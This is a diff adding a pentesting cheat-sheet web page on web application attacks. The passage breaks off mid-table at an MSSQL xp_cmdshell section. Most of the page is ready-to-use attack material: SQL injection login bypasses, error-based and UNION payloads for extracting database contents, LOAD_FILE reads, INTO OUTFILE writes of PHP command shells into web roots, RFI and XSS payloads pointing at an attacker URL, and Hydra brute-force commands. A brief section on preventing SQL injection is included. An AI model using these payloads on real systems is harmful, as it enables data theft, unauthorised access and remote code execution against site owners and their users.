@@ -1,0 +1,1611 @@
+---
+layout: default
+---
+<html>
+
+<head>
+	<title>Web Application Attacks</title>
+	<a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<hr>
+
+<body>
+
+	<h1>Web Application Attacks</h1>
+
+	<hr>
+
+	<h2>Strategy</h2>
+
+	<li>Web directory enumeration</li>
+	<ul>
+		<li>Web Enumeration Tools:</li>
+		<ul>
+			<li>gobuster</li>
+			<li>feroxbuster</li>
+		</ul>
+		<li>Web Enumeration Wordlists:</li>
+		<ul>
+			<li>/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</li>
+			<li>/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt</li>
+		</ul>
+	</ul>
+
+	<li>Interesting web pages to check</li>
+	<ul>
+		<li>Check for &lt;url&gt;/index.php/asp/aspx to try to determine which language the server uses.</li>
+		<li>Error Page. Go to non-existent url.</li>
+		<li>README.md</li>
+		<li>/robots.txt</li>
+		<li>Admin Portals</li>
+		<ul>
+			<li>Some common ones:</li>
+			<ul>
+				<li>Tomcat Manager</li>
+				<li>phpMyAdmin</li>
+			</ul>
+		</ul>
+	</ul>
+
+	<li>Look for exploits</li>
+	<ul>
+		<li>*Search github issues for words like: exploit, lfi, passwd*</li>
+		<li>Carefully look at different web app name variations (cutenews & cutephp)</li>
+		<li>Search exploits for website names even if they look "custom" or meaningless</li>
+	</ul>
+
+	<li>Read all web pages</li>
+	<ul>
+		<li>Look for usernames</li>
+		<li>Look at source code for all pages</li>
+		<ul>
+			<li>Hidden functions</li>
+			<li>Comments with sensitive information</li>
+		</ul>
+	</ul>
+
+	<li>Burp</li>
+	<ul>
+		<li>Inspect web page requests</li>
+		<ul>
+			<li>Hidden directories may be revealed</li>
+			<ul>
+				<li>GET request on /hello-world/ initiated a bunch of other GET requests behind the scenes and this
+					revealed hidden web directories </li>
+			</ul>
+			<li>Interesting headers may be revealed</li>
+		</ul>
+	</ul>
+
+	<li>Nikto</li>
+	<ul>
+		<li>Web server scanner. Very noisy.</li>
+		<li>Unable to connect to https host</li>
+		<ul>
+			<li>MinProtocol = None</li>
+			<li>CipherString = Default</li>
+		</ul>
+	</ul>
+
+	<li>sql injection</li>
+	<ul>
+		<li>Test *all* input forms</li>
+		<li>&lt;url&gt;.com/id=&lt;Test for sql injection&gt;</li>
+		<li>Sql injection</li>
+		<li>nosql injection</li>
+	</ul>
+
+	<li>SSTI</li>
+	<ul>
+		<li>Look for anywhere that displays user input</li>
+		<li>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</li>
+		<img
+			src="https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Images/serverside.png">
+	</ul>
+
+	<li>Input Forms</li>
+	<ul>
+		<li>Test for LFI and RFI</li>
+		<li>Play with input lengths</li>
+	</ul>
+
+	<li>Directory Traversal</li>
+	<ul>
+		<li>Look for links such as: &lt;url&gt;/test.php?page=mkdocs</li>
+		<ul>
+			<li>RFI</li>
+			<ul>
+				<li>page=http://&lt;attacker url&gt;/shell.php</li>
+			</ul>
+			<li>LFI</li>
+			<ul>
+				<li>?file=&lt;directory&gt;</li>
+				<ul>
+					<li>try to change it to file=/etc/passwd or file=C:\boot.ini</li>
+				</ul>
+				<li>Log poisoning</li>
+				<ul>
+					<li>LFI and code execution combo</li>
+				</ul>
+			</ul>
+		</ul>
+	</ul>
+
+	<li>Brute force vhosts</li>
+	<ul>
+		<li>If a domain name is being used then check if any subdomains exist</li>
+		<li>ffuf -c -u http://&lt;ip address&gt; -H &quot;Host: FUZZ.&lt;domain&gt;&quot; -w &lt;wordlist&gt;</li>
+		<li>FUZZ vhosts for variations of known subdomains.</li>
+		<ul>
+			<li>Known subdomain: preprod-billing.rootdomain | preprod-FUZZ.rootdomain</li>
+		</ul>
+	</ul>
+
+	<li>Log poisoning</li>
+	<ul>
+		<li>Check for &lt;log&gt;.php/asp/aspx</li>
+		<ul>
+			<li>If logs are keeping track of HTTP request user-agents then set user-agent to web shell code and then
+				navigate to the log using LFI</li>
+		</ul>
+	</ul>
+
+	<li>Check github page for web application</li>
+	<ul>
+		<li>Look for issues which may reveal vulnerabilities or exploits</li>
+		<li>Look at file in web app directory, might be able to find something interesting to look for on the victim
+		</li>
+	</ul>
+
+	<hr>
+
+	<h2>Login Page</h2>
+
+	<li>Password attack</li>
+	<ul>
+		<li>Common Credentials</li>
+		<ul>
+			<li>Check seclist wordlist for web app specific default credential lists.</li>
+			<ul>
+				<li>/usr/share/seclists/Passwords/Default-Credentials</li>
+			</ul>
+		</ul>
+		<li>Brute force</li>
+		<ul>
+			<li>Hydra</li>
+			<table>
+				<tr>
+					<td>Post form bruteforce</td>
+					<td>
+						<li>hydra -L &lt;usernames list&gt; -P &lt;password list&gt; &lt;ip address&gt; http-post-form &quot;&lt;login web path&gt;:&lt;post request data&gt;:&lt;invalid login web page text&gt;"</li>
+						<li>hydra -L users_email.list -P cewl.out 10.129.71.58 http-post-form &quot;/login:email=^USER^&amp;password=^PASS^:Something went wrong, sorry about that...&quot;</li>
+					</td>
+				</tr>
+			</table>
+			
+			<li>BurpSuite Intruder</li>
+			<li>Wordpress - wpscan (also an overall vulnerability scanner)</li>
+		</ul>
+		<li>PHP Juggling Bug / Bypass Login</li>
+		<ul>
+			<li>Abuses how PHP interprets == vs === comparisons</li>
+			<ul>
+				<li>== is a lazy comparison</li>
+				<li>=== is a strict comparison</li>
+			</ul>
+			<li>PHP juggling login bypass examples</li>
+			<ul>
+				<li>GET (or POST?) request</li>
+				<ul>
+					<li>Content-Type: Application/json</li>
+					<li>Request Data: {&quot;password&quot;:true}</li>
+				</ul>
+			</ul>
+		</ul>
+	</ul>
+
+	<li>Enumerate valid users with error message</li>
+	<ul>
+		<li>Check for unique errors</li>
+		<ul>
+			<li>For users we know exists</li>
+			<ul>
+				<li>With valid password</li>
+				<li>With invalid password</li>
+			</ul>
+			<li>For users we know do not exist</li>
+		</ul>
+	</ul>
+
+	<hr>
+
+	<h2>XSS</h2>
+	<li>Simple payloads</li>
+	<ul>
+		<li>&lt;img src=&quot;&lt;attacker url&gt;&quot;&gt;</li>
+		<ul>
+			<li>Setup listener on attack machine and listen for connection.</li>
+		</ul>
+		<li>&lt;script&gt;alert(testing123)&lt;/script&gt;</li>
+	</ul>
+
+	<hr>
+
+	<h2>SQL Injection</h2>
+
+	<li>Types of SQL Injection</li>
+	<ul>
+		<li>In-band</li>
+		<ul>
+			<li>Error based</li>
+			<ul>
+				<li>Send queries are sent that cause the application to output SQL error message. Information about the
+					database can be learned through them.</li>
+			</ul>
+
+			<li>Union based</li>
+			<ul>
+				<li>UNION sql queries are used to grab information from the database and output it to the web
+					application.</li>
+			</ul>
+		</ul>
+
+		<li>Blind</li>
+		<ul>
+			<li>Boolean</li>
+			<ul>
+				<li>A SQL query is sent that contains a condition that causes the server to respond differently
+					depending on if the condition is true or false.</li>
+			</ul>
+
+			<li>Time-based</li>
+			<ul>
+				<li>Sql queries are used that cause the server to delay it's response a predictable amount of time. A
+					sql injection is confirmed if the server responds in the delayed predictable amount of time.</li>
+			</ul>
+		</ul>
+
+		<li>Out-of-band</li>
+		<ul>
+			<li>Output of the sql injection is read through an outbound communication via HTTP or DNS from the sql
+				server.</li>
+		</ul>
+
+		<li>Second order</li>
+		<ul>
+			<li>The sql injection is stored in the database somewhere and then retrieved using another method in order
+				to execute the sql query.</li>
+			<li>Example: create a user on a website with a name that is actually a sql injection query. Look at that
+				user on the website to see the output of the query.</li>
+		</ul>
+	</ul>
+
+	<li>Preventing SQL injection</li>
+	<ul>
+		<li>Prepared Statements</li>
+		<ul>
+			<li>SQL queries are turned into prepared statements and user input is bound to a variable that is passed to
+				the perpared statement.</li>
+			<li>User input cannot be used to change the function of the sql query.</li>
+		</ul>
+
+		<li>Stored Procedures</li>
+		<ul>
+			<li>Similar to prepared statements except the parameterized sql queries are stored in the database itself.
+			</li>
+			<li>Dynamic sql queries used within stored procedures can introduce sql injection vulnerabilities.</li>
+		</ul>
+
+		<li>Object Relational Mapping (ORM)</li>
+		<ul>
+			<li>Interact with sql database using a programming language instead of directly with sql queries.</li>
+			<li>Uses parameterized queries behind the scenes.</li>
+			<li>Can be insecure especially if concatenated sql queries are used in combination with ORM.</li>
+		</ul>
+
+		<li>Input validation</li>
+		<ul>
+			<li>Filter the input and convert the value to something else (boolean, a date, etc) and append that value to
+				the sql query.</li>
+		</ul>
+
+		<li>Escape inputs</li>
+		<ul>
+			<li>Last resort.</li>
+			<li>Escape user input before placing it in a query.</li>
+			<li>Techniques for input escaping is database specific.</li>
+			<li>Proper character escaping will make it so user input is not confused as part of the sql statement.</li>
+		</ul>
+
+		<li>Input santitization</li>
+		<ul>
+			<li>Limit character length.</li>
+			<li>Whitelist characters - only allow certain characters to be used.</li>
+			<li>Blacklist characters - do not allow certain characters to be used.</li>
+		</ul>
+
+		<li>Least privilege</li>
+		<ul>
+			<li>Assign the database account the lowest privilege possible so if it does get exploited the attack
+				possibilities will be limited.</li>
+			<li>Give access to stored procedures only, no direct access to tables.</li>
+			<li>Run mysql under the lowest possible privilege OS account.</li>
+		</ul>
+
+		<li>Web Application Firewall (WAF)</li>
+		<ul>
+			<li>Detects sql injection signatures and filters them out. These signatures are part of a constantly updated
+				database that the firewall uses.</li>
+		</ul>
+
+		<li>Do not display errors on the webpage</li>
+		<ul>
+			<li>Such as: &ldquo;&lt;&gt;/?*()&amp;,SQL,SCRIPT,SELECT,INSERT,UPDATE,DROP,%0A,%0D,%00</li>
+			</li>
+		</ul>
+	</ul>
+
+	<table>
+		<tr>
+			<td>Test for sql injections</td>
+			<td>'<br>' or 1=1-- -<br>a' or 1=1-- -<br>' or 1=2-- -<br>a' or 1=2-- -<br>1 or 1=2-- -<br>' UNION SELECT
+				sleep(5)-- -</td>
+		</tr>
+	</table>
+
+	<li>Blind SQL Injection:</li>
+	<ul>
+		<li>In a blind SQL injection attack there is no SQL output, but the SQL injection is working behind the scenes
+		</li>
+		<li>Need to inject a statement to make the query valid or invalid</li>
+		<li> Testing for blind sql injection</li>
+		<ul>
+			<li>Compare the webpage output when inputting a valid vs invalid sql query</li>
+			<table>
+				<tr>
+					<td>Test a valid sql query</td>
+					<td>
+						<li>' or 1=1</li>
+						<li>On a login page (username:' or 1=1 & Password: Anything)</li>
+					</td>
+				</tr>
+				<tr>
+					<td>Test invalid sql query</td>
+					<td>
+						<li>' or 1=2</li>
+						<li>On login page (username:' or 1=2 & Password: Anything)</li>
+					</td>
+				</tr>
+			</table>
+			<ul>
+				<li>If you get different output based on injecting a valid or invalid statement, then the page might be
+					vulnerable to blind sql injection.</li>
+			</ul>
+		</ul>
+	</ul>
+
+	<li>Examples of login bypass:</li>
+	<table>
+		<tr>
+			<td>USERNAME:</td>
+			<td>admin' or 'a'='a</td>
+		</tr>
+		<tr>
+			<td>PASSWORD:</td>
+			<td>'#</td>
+		</tr>
+		<tr>
+			<td>Explanation</td>
+			<td>
+				<li>SELECT * FROM users WHERE username = '" + input_username + "' AND password ='" + input_password +
+					"'";</li>
+				<br>turns into:<br>
+				<li>SELECT * FROM users WHERE username = 'admin' AND password = '' or 'a'='a'</li>
+			</td>
+		</tr>
+		<tr>
+			<td> </td>
+			<td> </td>
+		</tr>
+		<tr>
+			<td>USERNAME:</td>
+			<td>' or 1=1-- -</td>
+		</tr>
+		<tr>
+			<td>PASSWORD:</td>
+			<td>&lt;anything&gt;</td>
+		</tr>
+		<tr>
+			<td>Explanation</td>
+			<td>
+				<li>SELECT * FROM users WHERE username = '" + input_username + "' AND password ='" + input_password +
+					"'";</li>
+				<br>turns into:<br>
+				<li>SELECT * FROM users WHERE username = '' or 1=1 -- AND password = '&lt;anything&gt;'</li>
+			</td>
+		</tr>
+	</table>
+
+
+	<h4>SQL Injection Error Attack</h4>
+	<li>Error Injection Method #1 - Current DB</li>
+	<table>
+		<tr>
+			<td>Enumerate number of databases</td>
+			<td>1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT([name]) AS nvarchar(4000)) FROM
+				[master]..[sysdatabases] )+CHAR(58)+CHAR(58)))--</td>
+		</tr>
+		<tr>
+			<td>Extract database name by number</td>
+			<td>
+				<table>
+					<tr>
+						<td>Method #1</td>
+						<td>1 AND 1=CONVERT(INT,db_name(<mark>&lt;database #&gt;</mark>))--</td>
+					</tr>
+					<tr>
+						<td>Method #2</td>
+						<td>1 AND 1=CONVERT(INT,(SELECT CAST(name AS nvarchar(4000)) FROM master..sysdatabases WHERE
+							dbid=<mark>&lt;database #&gt;</mark>))--</td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+		<tr>
+			<td>Extra table count from current DB</td>
+			<td>1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM
+				information_schema.TABLES )+CHAR(58)+CHAR(58)))--</td>
+		</tr>
+		<tr>
+			<td>Extract table names from current DB</td>
+			<td>1 AND 1= CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top
+				<mark>&lt;increase # starting with 1&gt;</mark> TABLE_NAME FROM information_schema.TABLES ORDER BY
+				TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58)))--</td>
+		</tr>
+		<tr>
+			<td>Extract column names from a table in current DB</td>
+			<td>1 AND 1=CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top
+				<mark>&lt;increase # starting with 1&gt;</mark> column_name FROM information_schema.COLUMNS WHERE
+				TABLE_NAME='<mark>&lt;table name&gt;</mark>' ORDER BY column_name ASC) sq ORDER BY column_name
+				DESC)+CHAR(58)))--</td>
+		</tr>
+		<tr>
+			<td>Extract number of rows in a table in current DB</td>
+			<td>1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM
+				<mark>&lt;table name&gt;</mark>)+CHAR(58)+CHAR(58)))--</td>
+		</tr>
+		<tr>
+			<td>Extract data for two columns by row #</td>
+			<td>1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 <mark>&lt;column
+					1&gt;</mark>+CHAR(58)+<mark>&lt;column2&gt;</mark> FROM (SELECT top <mark>&lt;increase # starting
+					with 1&gt;</mark> <mark>&lt;column 1&gt;</mark> , <mark>&lt;column 2&gt;</mark> FROM <mark>&lt;table
+					1&gt;</mark> ORDER BY <mark>&lt;column 1&gt;</mark> ASC) sq ORDER BY <mark>&lt;Column 1&gt;</mark>
+				DESC)+CHAR(58)+CHAR(58)))--</td>
+		</tr>
+	</table>
+
+	<li>Error Injection Method #1 - Other DB's</li>
+	<table>
+		<tr>
+			<td>Extract tables from other DB</td>
+			<td>1 AND 1=CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top
+				<mark>&lt;increase # starting with 1&gt;</mark> TABLE_NAME FROM
+				<mark>&lt;other_db_name&gt;</mark>.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY
+				TABLE_NAME DESC)+CHAR(58)))--</td>
+		</tr>
+		<tr>
+			<td>Enumerate columns from table from other DB</td>
+			<td>1 AND 1=CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top
+				<mark>&lt;Increase # starting with 1&gt;</mark> column_name FROM
+				<mark>&lt;Database&gt;</mark>.information_schema.COLUMNS WHERE TABLE_NAME='<mark>&lt;Table&gt;</mark>'
+				ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58)))--</td>
+		</tr>
+		<tr>
+			<td>Extract number of rows in table from other DB</td>
+			<td>1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM
+				[<mark>&lt;Database&gt;</mark>]..[<mark>&lt;Table&gt;</mark>] )+CHAR(58)+CHAR(58)))--</td>
+		</tr>
+		<tr>
+			<td>Extract data from table in other DB</td>
+			<td>1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 <mark>&lt;Column&gt;</mark> FROM (SELECT top
+				<mark>&lt;Increase # starting with 1&gt;</mark> <mark>&lt;Column&gt;</mark> FROM
+				<mark>&lt;Database&gt;</mark>..<mark>&lt;Table&gt;</mark> ORDER BY <mark>&lt;Column&gt;</mark> ASC) sq
+				ORDER BY <mark>&lt;Column&gt;</mark> DESC)+CHAR(58)+CHAR(58)))--</td>
+		</tr>
+	</table>
+
+	<li>Error injection Method #2</li>
+	<table>
+		<tr>
+			<td>"HAVING" & "GROUP BY" error message attack<br><br>Enumerate table and column names</td>
+			<td>
+				<table>
+					<tr>
+						<td>Enumerate column 1 (Generates error message revealing &lt;table&gt;.&lt;column_1&gt;)</td>
+						<td>1' HAVING 1=1 --</td>
+					</tr>
+					<tr>
+						<td>Enumerate column 2 (Generates error message revealing &lt;table&gt;.&lt;column_2&gt;)</td>
+						<td>1' GROUP BY <mark>&lt;table&gt;</mark>.<mark>&lt;column 1&gt;</mark> HAVING 1=1 --</td>
+					</tr>
+					<tr>
+						<td>Enumerate column 3 (Generates error message revealing &lt;table&gt;.&lt;column_3&gt;)</td>
+						<td>1' GROUP BY <mark>&lt;table&gt;</mark>.<mark>&lt;column
+								1&gt;</mark>,<mark>&lt;table&gt;</mark>.<mark>&lt;column 2&gt;</mark></td>
+					</tr>
+					<tr>
+						<td>Continue enumerating columns until a normal result is returned</td>
+						<td></td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+		<tr>
+			<td>Enumerate DB names</td>
+			<td>
+				<table>
+					<tr>
+						<td>Enumerate db 0 name (Generate error: [SqlException (0x80131904): Conversion failed when
+							converting the nvarchar value '&lt;db_name(0)&gt;' to data type int.])</td>
+						<td>1 and 1=CONVERT(INT,db_name(<mark>0</mark>))--</td>
+					</tr>
+					<tr>
+						<td>Enumerate db 1 name (Generate error: [SqlException (0x80131904): Conversion failed when
+							converting the nvarchar value '&lt;db_name(1)&gt;' to data type int.])</td>
+						<td>1 and 1=CONVERT(INT,db_name(<mark>1</mark>))--</td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+		<tr>
+			<td>Enumerate table names using information_schema.tables</td>
+			<td>
+				<table>
+					<tr>
+						<td>Enumerate table 1 name (Generate error: failed when converting the nvarchar value
+							'&lt;table_1&gt;' to data)</td>
+						<td>1 and 1=convert(int,(select top 1 table_name from information_schema.tables))--</td>
+					</tr>
+					<tr>
+						<td>Enumerate table 2 name (Generate error: failed when converting the nvarchar value
+							'&lt;table_2&gt;' to data)</td>
+						<td>1 and 1=convert(int,(select top 1 table_name from information_schema.tables where table_name
+							not in ('<mark>&lt;table_1&gt;</mark>')))--</td>
+					</tr>
+					<tr>
+						<td>Enumerate table 3 name (Generate error: failed when converting the nvarchar value
+							'&lt;table_3&gt;' to data)</td>
+						<td>1 and 1=convert(int,(select top 1 table_name from_information_schema.tables where table_name
+							not in
+							(&#039;<mark>&lt;table_1&gt;</mark>&#039;,&#039;<mark>&lt;table_2&gt;</mark>&#039;)))--</td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+		<tr>
+			<td>Enumerate table columns using information_schema.tables</td>
+			<td>
+				<table>
+					<tr>
+						<td>Enumerate column 1 for table_1 (Generate error: failed when converting the nvarchar value
+							'&lt;column_1&gt;' to data)</td>
+						<td>1 and 1=convert(int,(select top 1 column_name from information_schema.columns where
+							table_name='<mark>&lt;table 1&gt;</mark>'))--</td>
+					</tr>
+					<tr>
+						<td>Enumerate column 2 for table_1 (Generate error: failed when converting the nvarchar value
+							'&lt;column_2&gt;' to data)</td>
+						<td>1 and 1=convert(int,(select top 1 column_name from information_schema.columns where
+							table_name='<mark>&lt;table 1&gt;</mark>' and column_name not in ('<mark>&lt;Column
+								1&gt;</mark>')))--</td>
+					</tr>
+					<tr>
+						<td>Enumerate column 3 for table_1 (Generate error: failed when converting the nvarchar value
+							'&lt;column_3&gt;' to data)</td>
+						<td>1 and 1=convert(int,(select top 1 column_name from information_schema.columns where
+							table_name='<mark>&lt;table 1&gt;</mark>&#039; and column_name not in
+							('<mark>&lt;Column_1&gt;</mark>','<mark>&lt;Column_2&gt;</mark>')))--</td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+		<tr>
+			<td>Enumerate data using table and column names</td>
+			<td>
+				<table>
+					<tr>
+						<td>Enumerate &lt;data_1&gt; from &lt;column_1&gt; information from &lt;table_1&gt; (Generate
+							error: failed when converting the nvarchar value '&lt;data_1&gt;' to data type int.)</td>
+						<td>1 and 1=convert(int,(select top 1 <mark>&lt;column_1&gt;</mark> from
+							<mark>&lt;table_1&gt;</mark>))--</td>
+					</tr>
+					<tr>
+						<td>Enumerate &lt;data_2&gt; from &lt;column_1&gt; information from &lt;table_1&gt; (Generate
+							error: failed when converting the nvarchar value '&lt;data_2&gt;' to data type int.)</td>
+						<td>1 and 1=convert(int,(select top 1 <mark>&lt;column_1&gt;</mark> from <mark>&lt;table
+								1&gt;</mark> where <mark>&lt;column_1&gt;</mark> not in
+							('<mark>&lt;data_1&gt;</mark>')))--</td>
+					</tr>
+					<tr>
+						<td>Enumerate &lt;data_3&gt; from &lt;column_1&gt; information from &lt;table_1&gt; (Generate
+							error: failed when converting the nvarchar value '&lt;data_3&gt;' to data type int.)</td>
+						<td>1 and 1=convert(int,(select top 1 <mark>&lt;column_1&gt;</mark> from
+							<mark>&lt;table_1&gt;</mark> where <mark>&lt;column_1&gt;</mark> not in
+							('<mark>&lt;data_1&gt;</mark>','<mark>&lt;data_2&gt;</mark>')))--</td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+	</table>
+
+	<h4>SQL Injection Union Attack</h4>
+
+	<li>Quick union attack method - group_concat</li>
+
+	<table>
+		<tr>
+			<td>Enumerate DB Names</td>
+			<td>
+				<table>
+					<tr>
+						<td>Format 1</td>
+						<td>1 and 1=2 UNION SELECT 1,group_concat(schema_name),3,4<mark>...(Enumerate # to go up to
+								using &#039; order by &lt;#&gt;-- -)</mark> from information_schema.schemata-- -</td>
+					</tr>
+					<tr>
+						<td>Format 2</td>
+						<td>' UNION SELECT 1,group_concat(schema_name),3,4<mark>...(Enumerate # to go up to using '
+								order by &lt;#&gt;-- -)</mark> from information_schema.schemata-- -</td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+		<tr>
+			<td>Enumerate all Tables from DB</td>
+			<td>
+				<table>
+					<tr>
+						<td>Format 1</td>
+						<td>1 and 1=2 UNION SELECT 1,2,3,4,group_concat(table_name),6 from information_schema.tables
+							where table_schema='<mark>&lt;DB Name&gt;</mark>'-- -</td>
+					</tr>
+					<tr>
+						<td>Format 2</td>
+						<td>'UNION SELECT group_concat(table_name),2,3,4,5,6 from information_schema.tables where
+							table_schema='<mark>&lt;DB Name&gt;</mark>'-- -</td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+		<tr>
+			<td>Enumerate Columns in Table</td>
+			<td>
+				<table>
+					<tr>
+						<td>Format 1</td>
+						<td>1 and 1=2 UNION SELECT 1,2,3,4,group_concat(column_name),6,7 from information_schema.columns
+							where table_name='<mark>&lt;Table Name&gt;</mark>'-- -</td>
+					</tr>
+					<tr>
+						<td>Format 2</td>
+						<td>'UNION SELECT 1,2,3,4,group_concat(column_name),6,7 from information_schema.columns where
+							table_name='<mark>&lt;Table Name&gt;</mark>'-- -</td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+		<tr>
+			<td>Enumerate Data from Table</td>
+			<td>
+				<table>
+					<tr>
+						<td>Format 1</td>
+						<td>1 and 1=2 UNION SELECT 1, <mark>&lt;Column Name&gt;</mark>,3,4,<mark>&lt;Column
+								Name&gt;</mark>,6,7 from <mark>&lt;DB name&gt;</mark>.<mark>&lt;Table&gt;</mark>-- -
+						</td>
+					</tr>
+					<tr>
+						<td>Format 2</td>
+						<td>'UNION SELECT 1, <mark>&lt;Column Name&gt;</mark>,3,4,<mark>&lt;Column Name&gt;</mark>,6,7
+							from <mark>&lt;DB name&gt;</mark>.<mark>&lt;Table&gt;</mark>-- -</td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+	</table>
+
+	<li>Long union attack method</li>
+
+	<table>
+		<tr>
+			<td>Enumerate # of columns</td>
+			<td>
+				<table>
+					<tr>
+						<td></td>
+						<td>Method 1</td>
+						<td>Method 2</td>
+						<td>Method 3</td>
+						<td>Method 4</td>
+					</tr>
+					<tr>
+						<td>Enumerate column 1</td>
+						<td>1 order by 1</td>
+						<td>' order by 1-- -</td>
+						<td>' UNION SELECT NULL--</td>
+						<td><mark>&lt;Legit Search&gt;</mark>' order by 1-- -</td>
+					</tr>
+					<tr>
+						<td>Enumerate column 2</td>
+						<td>1 order by 2 </td>
+						<td>' order by 2-- -</td>
+						<td>' UNION SELECT NULL,NULL--</td>
+						<td><mark>&lt;Legit Search&gt;</mark>' order by 1,2-- -</td>
+					</tr>
+					<tr>
+						<td>Continue until...</td>
+						<td>Error</td>
+						<td>Error</td>
+						<td>No error</td>
+						<td>No results</td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+		<tr>
+			<td>Find where information appears on the screen</td>
+			<td>
+				<li>1 and 1=2 UNION SELECT 1,2,3,4-- -</li>
+				<li>' UNION SELECT 1,2,3,4-- -</li>
+			</td>
+		</tr>
+		<tr>
+			<td>Enumerate table name</td>
+			<td>
+				<table>
+					<tr>
+						<td>Enumerate table_1</td>
+						<td>
+							<table>
+								<tr>
+									<td>Method #1</td>
+									<td>1 and 1=2 UNION SELECT 1,2,3,table_name from information_schema.tables--</td>
+								</tr>
+								<tr>
+									<td>Method #2</td>
+									<td>' UNION SELECT table_name,2 from information_schema.tables--</td>
+								</tr>
+							</table>
+						</td>
+					</tr>
+					<tr>
+						<td>Enumerate table_2</td>
+						<td>' UNION SELECT 1,2,3,table_name from information_schema.tables where table_name not in
+							('<mark>&lt;table_1&gt;</mark>')--</td>
+					</tr>
+					<tr>
+						<td>Enumerate table_3</td>
+						<td>' UNION SELECT 1,2,3,table_name from information_schema.tables where table_name not in
+							('<mark>&lt;table_1&gt;</mark>','<mark>&lt;table_2&gt;</mark>')--</td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+		<tr>
+			<td>Enumerate column names</td>
+			<td>
+				<table>
+					<tr>
+						<td>Enumerate column_1 for table_1</td>
+						<td>' UNION SELECT column_name,2 from information_schema.columns where
+							table_name='<mark>&lt;table_1&gt;</mark>'--</td>
+					</tr>
+					<tr>
+						<td>Enumerate column_2 for table_1</td>
+						<td>' UNION SELECT 1,2,3,column_name from information_schema.columns where
+							table_name='<mark>&lt;table_1&gt;</mark>' and column_name not in
+							('<mark>&lt;column_1&gt;</mark>')</td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+		<tr>
+			<td>Enumerate data</td>
+			<td>
+				<table>
+					<tr>
+						<td>Enumerate data_1 from column_1 of table_1</td>
+						<td>' UNION SELECT 1,2,3,<mark>&lt;column_1&gt;</mark> from <mark>&lt;table_1&gt;</mark>--</td>
+					</tr>
+					<tr>
+						<td>Enumerate data_2 from column_1 of table_1</td>
+						<td>' UNION SELECT 1,2,3,<mark>&lt;column_1&gt;</mark> from <mark>&lt;table_1&gt;</mark> where
+							<mark>&lt;column_1&gt;</mark> not in ('<mark>&lt;data_1&gt;</mark>')--</td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+	</table>
+
+	<li>Other useful injections</li>
+	<ul>
+		<li>'UNION SELECT 1,<mark>&lt;insert from the below&gt;</mark>,3....-- -</li>
+	</ul>
+
+	<table>
+		<tr>
+			<td>Mysql version</td>
+			<td>@@version-- -</td>
+		</tr>
+		<tr>
+			<td>Mysql user</td>
+			<td>
+				<li>user()</li>
+				<li>system_user()</li>
+			</td>
+		</tr>
+		<tr>
+			<td>Read file</td>
+			<td>LOAD_FILE('<mark>&lt;File&gt;</mark>')</td>
+		</tr>
+		<tr>
+			<td>Reveal data directory</td>
+			<td>@@datadir</td>
+		</tr>
+		<tr>
+			<td>Display file contents in base64</td>
+			<td>
+				<li>TO_BASE64(<mark>&lt;file&gt;</mark>)</li>
+				<li>(select TO_BASE64(LOAD_FILE("C:\\inetpub\\wwwroot\\uploads\\shell.php")))</li>
+			</td>
+		</tr>
+		<tr>
+			<td>Create file</td>
+			<td>'union select ("<mark>&lt;text&gt;</mark>"),2,3,4,5,6 INTO OUTFILE '<mark>&lt;directory&gt;</mark>'-- -
+			</td>
+		</tr>
+		<tr>
+			<td>Create a reverse shell</td>
+			<td>
+				<li>' UNION SELECT "
+					<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';-- -
+				</li>
+				<li>&apos; UNION SELECT (&lt;?php system($_REQUEST[&quot;cmd&quot;]);) INTO OUTFILE
+					&apos;/var/www/html/shell.php&apos;;-- -</li>
+				<li>&#039; UNION SELECT (&quot;&lt;?php echo passthru($_GET[&#039;cmd&#039;]);&quot;) INTO OUTFILE
+					&#039;C:/xampp/htdocs/shell.php&#039; -- -</li>
+				<li>&#039; UNION SELECT (&lt;?php echo exec($_GET[&quot;cmd&quot;]);) INTO OUTFILE
+					&#039;/srv/http/shell.php&#039;;-- -</li>
+			</td>
+		</tr>
+	</table>
+
+	<li>MSSQL</li>
+	<ul>
+		<li>xp_cmdshell</li>
+		<ul>
+			<li>Only executable by 'sa' or other users with 'sysadmin' privileges</li>
+			<li>Available by default on all MSSQL (Disabled on MSSQL 2005)</li>
+		</ul>
+		<table>
+			<tr>
+				<td>Enable xp_cmdshell</td>
+				<td>
+					<table>
